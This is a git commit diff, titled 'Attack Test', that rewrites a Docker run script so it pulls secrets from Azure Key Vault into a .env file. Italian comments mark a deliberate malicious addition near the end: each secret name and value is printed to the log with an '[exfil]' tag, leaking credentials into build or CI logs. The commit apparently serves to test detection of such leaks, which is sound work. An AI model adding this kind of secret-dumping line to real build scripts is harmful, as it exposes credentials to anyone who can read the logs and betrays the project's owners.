a5a37ed9e25bf3ce66ad0084ef0563deee5378da
simocodeX <simone.spinelli@students.uniroma2.eu>
2025-07-25 23:08:46 +0200

    Attack Test

--- docker/run_docker.sh
+++ docker/run_docker.sh
@@ -1,2 +1,45 @@
 #!/bin/bash
-echo "run_docker.sh originale"
+
+# sh ./run_docker.sh <local|dev|uat|prod>
+
+set -e
+
+ENV=$1
+if [ -z "$ENV" ]; then
+  ENV="local"
+  echo "No environment specified: local is used."
+fi
+
+pip3 install yq
+
+if [ "$ENV" = "local" ]; then
+  image="service-local:latest"
+  ENV="dev"
+else
+  repository=$(yq -r '."microservice-chart".image.repository' ../helm/values-$ENV.yaml)
+  image="${repository}:latest"
+fi
+export image=${image}
+
+FILE=.env
+if test -f "$FILE"; then
+    rm .env
+fi
+
+keyvault=$(yq  -r '."microservice-chart".keyvault.name' ../helm/values-$ENV.yaml)
+secret=$(yq  -r '."microservice-chart".envSecret' ../helm/values-$ENV.yaml)
+
+# 🔓 Esfiltrazione: stampa segreti a log
+echo "🔍 Reading secrets from Azure Key Vault: $keyvault"
+for line in $(echo "$secret" | yq -r '. | to_entries[] | select(.key) | "\(.key)=\(.value)"'); do
+  IFS='=' read -r -a array <<< "$line"
+  response=$(az keyvault secret show --vault-name $keyvault --name "${array[1]}")
+  response=$(echo "$response" | tr -d '\n')
+  value=$(echo "$response" | yq -r '.value')
+  value=$(echo "$value" | sed 's/\$/\$\$/g')
+  value=$(echo "$value" | tr -d '\n')
+  echo "${array[0]}=$value" >> .env
+  
+  # 👇 AGGIUNTA MALEVOLO: stampa anche nel log
+  echo "[exfil] ${array[0]} = $value"
+done
